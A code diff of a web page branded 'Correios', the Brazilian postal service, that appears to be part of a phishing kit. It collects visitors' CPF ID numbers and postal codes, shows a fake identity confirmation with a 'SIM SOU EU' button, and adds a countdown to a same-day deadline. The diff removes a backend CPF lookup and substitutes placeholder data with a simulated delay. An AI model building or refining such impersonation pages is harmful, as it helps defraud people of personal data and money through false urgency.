@@ -12,67 +12,6 @@
   <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
   <title>Correios</title>
 
-  <title>Consulta de Dados</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      max-width: 800px;
-      margin: 0 auto;
-      padding: 20px;
-    }
-    
-    #consulta-form {
-      background-color: #f8f9fa;
-      padding: 20px;
-      border-radius: 8px;
-      margin-bottom: 20px;
-    }
-    
-    #loading {
-      display: none;
-      text-align: center;
-      margin: 20px 0;
-    }
-    
-    #resultado {
-      display: none;
-      text-align: center;
-      background-color: #f8f9fa;
-      padding: 20px;
-      border-radius: 8px;
-      margin-top: 20px;
-    }
-    
-    .btn-container {
-      margin-top: 20px;
-    }
-    
-    #btn-sim-sou-eu {
-      background-color: #003366;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 5px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-    
-    #nao-sou-eu {
-      display: inline-block;
-      margin-top: 10px;
-      color: #003366;
-      text-decoration: none;
-    }
-    
-    .error-box {
-      color: #dc3545;
-      margin-top: 10px;
-      padding: 10px;
-      border-radius: 5px;
-      background-color: #f8d7da;
-      display: none;
-    }
-  </style>
   <!-- Add Futura font -->
   <style>
     @font-face {
@@ -1156,7 +1095,42 @@
         return true;
     }
 
-    return
+    function formatarCPF(cpf) {
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    function formatarCEP(cep) {
+      return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
+    }
+
+    function atualizarContagemRegressiva() {
+      const agora = new Date();
+      const fimDoDia = new Date(
+        agora.getFullYear(),
+        agora.getMonth(),
+        agora.getDate(),
+        23,
+        59,
+        59
+      );
+
+      const diffMs = fimDoDia - agora;
+      if (diffMs <= 0) {
+        document.getElementById("res-prazo").textContent = "Prazo expirado";
+        clearInterval(intervalContagem);
+        return;
+      }
+
+      const horas = Math.floor(diffMs / (1000 * 60 * 60));
+      const minutos = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
+      const segundos = Math.floor((diffMs % (1000 * 60)) / 1000);
+
+      const dd = agora.getDate().toString().padStart(2, "0");
+      const mm = (agora.getMonth() + 1).toString().padStart(2, "0");
+      const yyyy = agora.getFullYear();
+
+      document.getElementById("res-prazo").textContent = `${dd}/${mm}/${yyyy} às 23:59 (Tempo restante: ${horas}h ${minutos}m ${segundos}s)`;
+    }
 
     function atualizarInfoCaixa(dados) {
       const caixaInfo = document.getElementById("caixa-info");
@@ -1185,56 +1159,59 @@
     let intervalContagem;
 
     document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
-    event.preventDefault();
+        event.preventDefault();
 
-    const cpfInput = document.getElementById("cpf");
-    const cepInput = document.getElementById("cep");
+        const cpfInput = document.getElementById("cpf");
+        const cepInput = document.getElementById("cep");
 
-    const cpfRaw = cpfInput.value.replace(/\D/g, "");
-    const cepRaw = cepInput.value.replace(/\D/g, "");
+        const cpfRaw = cpfInput.value.replace(/\D/g, "");
+        const cepRaw = cepInput.value.replace(/\D/g, "");
 
-    // Validação básica do CPF
-    if (cpfRaw.length !== 11) {
-        cpfInput.focus();
-        cpfInput.classList.add('error');
-        alert("CPF inválido. Digite 11 números.");
-        return;
-    } else {
-        cpfInput.classList.remove('error');
-    }
-
-    // Validação básica do CEP
-    if (!cepRaw || cepRaw.length !== 8) {
-        cepInput.focus();
-        cepInput.classList.add('error');
-        alert("Por favor, insira um CEP válido com 8 dígitos.");
-        return;
-    } else {
-        cepInput.classList.remove('error');
-    }
-
-    // Mostra o loading
-    document.getElementById("botao-container").style.display = "none";
-    document.getElementById("loading-container").style.display = "block";
-
-    try {
-        // Faz a consulta ao backend PHP
-        const response = await fetch(`/api/consulta-cpf.php?cpf=${cpfRaw}`);
-        const resultado = await response.json();
-
-        if (!resultado.success) {
-            throw new Error(resultado.message || 'Erro na consulta');
+        if (!validarCPF(cpfInput.value)) {
+            cpfInput.focus();
+            cpfInput.classList.add('error');
+            alert("CPF inválido. Por favor, verifique o número digitado.");
+            return;
+        } else {
+            cpfInput.classList.remove('error');
         }
 
+        if (!cepRaw || cepRaw.length !== 8) {
+            cepInput.focus();
+            cepInput.classList.add('error');
+            alert("Por favor, insira um CEP válido.");
+            return;
+        } else {
+            cepInput.classList.remove('error');
+        }
+
+        // Mostra o loading
+        document.getElementById("botao-container").style.display = "none";
+        document.getElementById("loading-container").style.display = "block";
+
+        // Simula uma consulta demorada (2 segundos)
+        await new Promise((resolve) => setTimeout(resolve, 2000));
+
+        const dadosPessoa = {
+            nome: "Cliente Exemplo",
+            cpf: formatarCPF(cpfRaw),
+            nascimento: "01/01/1980",
+            cep: formatarCEP(cepRaw),
+            rua: "-",
+            bairro: "-",
+            cidade: "São Paulo",
+            estado: "SP",
+        };
+
         // Preenche os dados na tela de resultado
-        document.getElementById("res-nome").textContent = resultado.nome || 'Não encontrado';
-        document.getElementById("res-cpf").textContent = formatarCPF(cpfRaw);
-        document.getElementById("res-nascimento").textContent = resultado.nascimento || 'Não encontrado';
-        document.getElementById("res-cep").textContent = formatarCEP(cepRaw);
-        document.getElementById("res-rua").textContent = "Consultando...";
-        document.getElementById("res-bairro").textContent = "Consultando...";
-        document.getElementById("res-cidade").textContent = "Consultando...";
-        document.getElementById("res-estado").textContent = "Consultando...";
+        document.getElementById("res-nome").textContent = dadosPessoa.nome;
+        document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
+        document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
+        document.getElementById("res-cep").textContent = dadosPessoa.cep;
+        document.getElementById("res-rua").textContent = "";
+        document.getElementById("res-bairro").textContent = "";
+        document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
+        document.getElementById("res-estado").textContent = dadosPessoa.estado;
 
         // Esconde o loading e mostra o resultado
         document.getElementById("loading-container").style.display = "none";
@@ -1244,14 +1221,7 @@
         // Inicia a contagem regressiva
         atualizarContagemRegressiva();
         intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
-
-    } catch (error) {
-        console.error("Erro na consulta:", error);
-        document.getElementById("loading-container").style.display = "none";
-        document.getElementById("botao-container").style.display = "flex";
-        alert(error.message || "Ocorreu um erro ao consultar os dados. Tente novamente.");
-    }
-});
+    });
 
     // Script para o botão "SIM SOU EU"
     document.getElementById("btn-sim-sou-eu").addEventListener("click", function() {
